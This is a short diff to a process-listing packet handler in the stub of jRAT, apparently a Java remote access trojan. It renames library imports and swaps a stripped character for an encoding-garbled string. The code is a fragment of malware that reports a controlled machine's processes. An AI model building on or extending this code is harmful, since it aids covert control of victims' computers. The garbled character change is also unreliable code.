@@ -4,18 +4,15 @@ import io.jrat.common.ProcessData;
 import io.jrat.common.utils.DataUnits;
 import io.jrat.stub.Connection;
 import io.jrat.stub.packets.outgoing.Packet25Process;
-
 import java.awt.image.BufferedImage;
 import java.io.BufferedReader;
 import java.io.File;
 import java.io.InputStreamReader;
-
 import javax.swing.ImageIcon;
 import javax.swing.filechooser.FileSystemView;
-
-import com.redpois0n.oslib.OperatingSystem;
-import com.redpois0n.oslib.windows.WindowsOperatingSystem;
-import com.redpois0n.oslib.windows.WindowsVersion;
+import oslib.OperatingSystem;
+import oslib.windows.WindowsOperatingSystem;
+import oslib.windows.WindowsVersion;
 
 
 public class Packet19ListProcesses extends AbstractIncomingPacket {
@@ -111,7 +108,7 @@ public class Packet19ListProcesses extends AbstractIncomingPacket {
 					}
 				}
 			} else {
-				line = line.replace("\"", "").replace("ÿ", "");
+				line = line.replace("\"", "").replace("ï¿½", "");
 				String[] sline = line.split(",");
 
 				data[0] = sline[0]; // name
